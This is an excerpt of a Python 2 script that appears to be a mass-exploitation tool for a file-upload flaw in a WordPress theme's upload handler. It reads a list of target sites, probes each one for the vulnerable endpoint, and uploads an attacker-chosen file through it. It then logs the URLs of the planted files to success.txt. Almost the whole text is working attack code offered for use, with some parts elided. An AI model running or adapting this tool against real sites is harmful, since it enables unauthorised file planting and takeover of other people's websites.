...
def hek(nick,sc,site):
	try:
		for target in site:
			cek=r.get(target+'/wp-content/themes/kernel-theme/functions/upload-handler.php').text
			if cek == 'error':
				exp=r.post(target+'/wp-content/themes/kernel-theme/functions/upload-handler.php',files={'orange_themes':(nick,sc,'text/html')}).text
				if nick in exp:
					print '%s[ %ssuccess %s] %s/wp-content/uploads/%s/%s/%s'%(W0,G0,W0,target,now.strftime('%Y'),now.strftime('%m'),nick)
					open('success.txt','a+').write(target+'/wp-content/uploads/'+now.strftime('%Y')+'/'+now.strftime('%m')+'/'+nick)
				else:
...
try:
 ...
 |__/|__/_/       %sorange themes
	'''%(C1,W0,C1,W0,C1,W0)
	hek(sys.argv[1],open(sys.argv[2]).read(),open(sys.argv[3]).read().splitlines())
